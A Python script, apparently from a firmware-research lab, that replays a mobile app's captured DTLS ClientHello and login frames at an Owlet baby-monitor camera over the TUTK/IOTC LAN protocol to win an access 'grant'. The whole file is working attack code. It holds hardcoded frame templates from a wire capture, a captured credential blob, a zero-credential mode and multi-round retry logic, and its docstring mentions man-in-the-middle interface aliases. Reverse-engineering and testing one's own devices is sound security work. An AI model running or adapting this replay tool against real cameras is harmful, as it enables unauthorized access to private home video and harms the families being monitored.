#!/usr/bin/env python3
"""Owlet direct connect — the app's own auth frames, replayed at the camera (fss-kemuu).

Built from the 2026-11-03 wire capture (`docs/exploit/captures/owlet_auth_java_hook_2026-11-03.log`,
inverted with the proven transcoder, §9.15). The app sends, on the IOTC session socket, a
291-byte DTLS ClientHello and then a 168-byte login whose payload is

    30 00 0d "AUTHPWD_admin" 20 <32-byte credential material>

Both frames carry the same 8-byte session tag at plaintext[20:28] and the same header word at
[8:16]; that stability is what our old cubo builder lacked (it wrote R and zeros there). The
frames transcode to the `3e6c…` wire prefix the app uses.

Sequence per round (native TUTK): probe → nO → ACK → the camera re-arms with a second 0x0602 →
ClientHello + login 8 ms apart → wait. PASS = the camera answers 0x2041 (the grant).

  sudo owlet_direct_connect.py fire [--rounds N] [--blob MODE] [--wait S] [--legacy]

Blob modes for the 32-byte credential field: ascii (minted password, NUL-padded — default),
zero (framing-only baseline), raw (hex-decoded password, zero-padded), captured (the app's own
bytes from the capture, session-specific).
"""
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import owlet_grant_loop as gl   # probe/ACK/transcode/L2 send/creds are shared

# plaintext templates, verbatim from the capture (session tag and random are substituted)
HELLO_T = bytes.fromhex(
    "04021d0a1301000004052400050300010c000000007d3c57439c3d3616feff000000000000000000"
    "fa010000ee00000000000000eefefdc9c02b1a956f612a050b21a08fa9019998e5878d84a187ad14"
    "26ab7ea9867ecf0000006cc02cc030009fcca9cca8ccaac02bc02f009ec024c028006bc023c0270067"
    "c00ac0140039c009c013003300ad00abccaeccadccac009d00a9ccab00ac00aa009c00a8003d003c"
    "c038c03600b700b300950091003500af008dc037c03500b600b200940090002f00ae008c00ff010000"
    "58000b000403000102000a000c000a001d0017001e00190018002300000016000000170000000d0030"
    "002e040305030603080708080809080a080b0804080508060401050106010303020303010201030202"
    "02040205020602")
LOGIN_T = bytes.fromhex(
    "04021d0a9800020004052400050300010c000000007d3c57439c3d3616fefd000000000000000200"
    "3c100000300001000000000030000d415554485057445f61646d696e20b373eb7669e67ce21436cd"
    "6c3be55f86f1e4a8ec5652eb1bab1327d09e47395a14fefd000000000000000300010116fefd0001"
    "0000000000000028f72bcc41ac7c06bb3bb60cc5d434541af823aeca9450b4913d97a3b81430cc8e"
    "3a2b7b7308042745")

BEACON_T = bytes.fromhex(
    "04021d02240000000104330000000000544445574e4b435a5653594c564c543731313141ff"
    "7c3c57439c3d360000000000080304")
BEACON_UID = slice(16, 36)
BEACON_TAG = slice(37, 45)
TAG_OFF = slice(20, 28)      # session tag: identical in both frames, echoed by the camera
RAND_OFF = slice(52, 84)     # ClientHello client random
TAIL_OFF = slice(128, 168)   # login DTLS Finished record body (handshake transcript)
IDENT = b"AUTHPWD_admin"     # 13 bytes; login[54] is its length
BLOB_OFF = 69                # 32 credential bytes, login[68] is the length (0x20)
CAPTURED_BLOB = bytes.fromhex("b373eb7669e67ce21436cd6c3be55f86f1e4a8ec5652eb1bab1327d09e47395a")


PLACEHOLDER_MAC = "02:00:00:00:00:00"


def _ifaces():
    """(iface, inet, ether) for interfaces with an address in the camera's subnet.

    The mitm aliases (.160, 8.8.8.8, ...) live on whichever interface ran the bring-up,
    and a placeholder ether means that interface is not the physical LAN — real links sort
    first so the preferred entry is the one that actually carries frames.
    """
    out, cur, mac = [], None, ""
    try:
        text = subprocess.run(["ifconfig"], capture_output=True, text=True).stdout
    except OSError:
        return out
    for line in text.splitlines():
        m = re.match(r"^(en\d+|bridge\d+):", line)
        if m:
            cur, mac = m.group(1), ""
            continue
        m = re.search(r"ether (\S+)", line)
        if m:
            mac = m.group(1)
            continue
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+) netmask", line)
        if m and cur and m.group(1).startswith("192.168."):
            out.append((cur, m.group(1), mac))
    out.sort(key=lambda e: e[2] == PLACEHOLDER_MAC)
    return out


def resolve_iface():
    """The camera's LAN moves between en0/en1 when Wi-Fi re-associates: follow the route,
    then any interface with an address in the camera subnet (en1 without IPv4 is dead)."""
    env = os.environ.get("IFACE")
    if env:
        return env, gl.MY_IP
    found = _ifaces()
    try:
        rt = subprocess.run(["route", "-n", "get", gl.CAM_IP],
                            capture_output=True, text=True).stdout
        m = re.search(r"interface: (\w+)", rt)
        # a host route can survive on an interface that lost its real link (en1 here)
        if m:
            for iface, ip, mac in found:
                if iface == m.group(1) and mac != PLACEHOLDER_MAC:
                    return iface, ip
    except OSError:
        pass
    if found:
        return found[0][0], found[0][1]
    return gl.IFACE, gl.MY_IP


def adopt_iface():
    iface, ip = resolve_iface()
    gl.IFACE, gl.MY_IP = iface, ip
    gl.FINGERPRINT = gl._local_mac()
    gl.log(f"iface={iface} src={ip}")
    return iface


def encode(plain: bytes) -> bytes:
    """Transcode WITH the tail Swap — the app's frames are data-channel frames (proved:
    only the swapped encode reproduces a captured beacon byte for byte)."""
    try:
        sys.path.insert(0, os.path.expanduser("~/fw-lab/owlet/cubo"))
        import cuboai_pure_owlet as cp
        return cp.transcode(plain, swap_tail=True)
    except Exception:
        return gl.transcode(plain)


def credential_blob(mode: str, password: str) -> bytes:
    if mode == "captured":
        return CAPTURED_BLOB
    if mode == "zero":
        return b"\x00" * 32
    if mode == "raw":
        try:
            return bytes.fromhex(password.ljust(len(password) + len(password) % 2, "0"))[:32] \
                .ljust(32, b"\x00")
        except ValueError:
            return password.encode()[:32].ljust(32, b"\x00")
    return password.encode()[:32].ljust(32, b"\x00")   # ascii


def build_session_frames(account: bytes, blob: bytes, tag=None, rand=None, tail=None):
    """ClientHello + login sharing one tag, exactly as the app emits them.

    tag/rand/tail are per-session; pass them to reproduce a captured frame byte for byte.
    """
    tag = tag or os.urandom(8)
    hello = bytearray(HELLO_T)
    login = bytearray(LOGIN_T)
    hello[TAG_OFF] = tag
    login[TAG_OFF] = tag
    hello[RAND_OFF] = rand or os.urandom(32)
    ident = b"AUTHPWD_" + account
    if len(ident) != len(IDENT):
        # same length only: the frame's length fields are not recomputed here
        ident = (ident + b"\x00" * len(IDENT))[:len(IDENT)]
    login[55:55 + len(IDENT)] = ident
    login[68] = len(blob)
    login[BLOB_OFF:BLOB_OFF + len(blob)] = blob
    login[TAIL_OFF] = tail if tail is not None else os.urandom(40)
    return encode(bytes(hello)), encode(bytes(login)), tag


def build_beacon(uid: bytes, tag: bytes) -> bytes:
    b = bytearray(BEACON_T)
    b[BEACON_UID] = uid[:20].ljust(20, b"\x00")
    b[BEACON_TAG] = tag
    return encode(bytes(b))


def classify(raw: bytes) -> int:
    """Frame type of a received datagram (88-byte search frames use the XOR codec)."""
    d = gl.xor_frame(raw) if len(raw) == 88 else gl.inv_transcode(raw)
    return int.from_bytes(d[8:10], "little") if len(d) >= 10 else 0


def round_trip(cred, round_no, blob_mode, wait_grant, post_grant=10.0, sport_opt=0,
               legacy=False, probe_tries=5, beacon=True):
    out = {"round": round_no, "grant": False}
    uid = cred["tutkid"].encode()
    account = b"admin"
    password = cred.get("password", "")
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.settimeout(2.5)
    rx.bind((gl.MY_IP, sport_opt))
    sport = rx.getsockname()[1]
    t0 = time.time()
    R = gl.gen_R()
    gl.log(f"[r{round_no}] probe R=0x{R:04x} sport={sport}")
    # the camera answers LAN search in bursts; retry the probe until it takes
    raw1 = addr1 = None
    for _ in range(probe_tries):
        gl.l2_send(gl.build_probe(uid, R), sport)
        gl.l2_send(gl.build_probe(uid, R), sport)
        try:
            raw1, addr1 = rx.recvfrom(2048)
            break
        except socket.timeout:
            continue
    if raw1 is None:
        out["stage"] = "no-nO"
        rx.close()
        return out, 1
    cam_addr = (addr1[0], addr1[1])
    gl.log(f"[r{round_no}] nO1 {len(raw1)}B from cam:{cam_addr[1]} "
           f"type={hex(classify(raw1))}")

    gl.l2_send_to(gl.build_ack(uid, R), sport, cam_addr)
    gl.log(f"[r{round_no}] ack → cam:{cam_addr[1]}")

    try:
        raw2, _ = rx.recvfrom(2048)
    except socket.timeout:
        out["stage"] = "ack-silent"
        rx.close()
        return out, 1
    typ2 = classify(raw2)
    gl.log(f"[r{round_no}] ack-reply {len(raw2)}B type={hex(typ2)}")
    if typ2 != 0x0602:
        out["stage"] = f"ack-reply-{hex(typ2)}"
        rx.close()
        return out, 1

    if legacy:
        frames = [gl.build_av_connect(gl.inv_transcode(raw2), R, account, password.encode(), 0)]
        gl.log(f"[r{round_no}] legacy av-connect {len(frames[0])}B")
    else:
        blob = credential_blob(blob_mode, password)
        hello, login, tag = build_session_frames(account, blob)
        frames = [hello, login]
        gl.log(f"[r{round_no}] session tag={tag.hex()} blob={blob_mode} "
               f"hello={len(hello)}B login={len(login)}B")
        # a session beacon first: it carries the UID and the tag, and is the only pre-handshake
        # frame the camera can use to bind our tag to us
        if beacon:
            for _ in range(3):
                gl.l2_send_to(build_beacon(uid, tag), sport, cam_addr)
                time.sleep(0.15)
    gl.l2_send_to(frames[0], sport, cam_addr)
    time.sleep(0.008)          # native pre-grant pair timing (8 ms)
    for f in frames[1:]:
        gl.l2_send_to(f, sport, cam_addr)

    rx.settimeout(wait_grant)
    deadline = time.time() + wait_grant
    while time.time() < deadline:
        try:
            raw3, addr3 = rx.recvfrom(65535)
        except socket.timeout:
            break
        typ3 = classify(raw3)
        rec = {"len": len(raw3), "type": hex(typ3), "from": f"{addr3[0]}:{addr3[1]}",
               "t": round(time.time() - t0, 3)}
        out.setdefault("post", []).append(rec)
        gl.log(f"[r{round_no}] post {len(raw3)}B type={hex(typ3)} from={addr3[1]} "
               f"t+{rec['t']}s hex={gl.hx(raw3, 96)}")
        if typ3 == 0x2041:
            out["grant"] = True
            gl.log(f"[r{round_no}] *** 0x2041 GRANT ***")
            rx.settimeout(post_grant)
            end = time.time() + post_grant
            while time.time() < end:
                try:
                    r4, a4 = rx.recvfrom(65535)
                except socket.timeout:
                    break
                gl.log(f"[r{round_no}] after {len(r4)}B type={hex(classify(r4))} "
                       f"hex={gl.hx(r4, 96)}")
            break
    if not out["grant"]:
        out["stage"] = "no-grant"
    rx.close()
    return out, 0 if out["grant"] else 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["fire"])
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--blob", default="ascii", choices=["ascii", "zero", "raw", "captured"])
    ap.add_argument("--wait", type=float, default=6.0, help="seconds to wait for 0x2041")
    ap.add_argument("--sport", type=int, default=0)
    ap.add_argument("--legacy", action="store_true", help="send the old 598B cubo av-connect")
    ap.add_argument("--no-beacon", action="store_true",
                    help="skip the pre-handshake session beacons")
    ap.add_argument("--backoff", type=float, default=20.0, help="seconds after a silent round")
    ap.add_argument("--probe-tries", type=int, default=5,
                    help="probe retries per round (the camera answers in bursts)")
    a = ap.parse_args()

    cred = gl.load_creds()
    if not cred:
        print("no credentials (run owlet_relay_watch.py mint)", file=sys.stderr)
        return 2
    adopt_iface()
    gl.log(f"direct connect: uid={cred['tutkid']} blob={a.blob} rounds={a.rounds} "
           f"legacy={a.legacy}")
    silent = 0
    for n in range(1, a.rounds + 1):
        out, code = round_trip(cred, n, a.blob, a.wait, sport_opt=a.sport,
                               legacy=a.legacy, probe_tries=a.probe_tries,
                               beacon=not a.no_beacon)
        if out.get("grant"):
            gl.log(f"GRANT at round {n}")
            return 0
        silent = silent + 1 if out.get("stage", "").startswith(("no-nO", "ack-silent")) else 0
        if silent >= 3:
            gl.log(f"{silent} silent rounds — back off {a.backoff}s")
            time.sleep(a.backoff)
            silent = 0
        time.sleep(2.0)
    gl.log("no grant")
    return 1


if __name__ == "__main__":
    sys.exit(main())
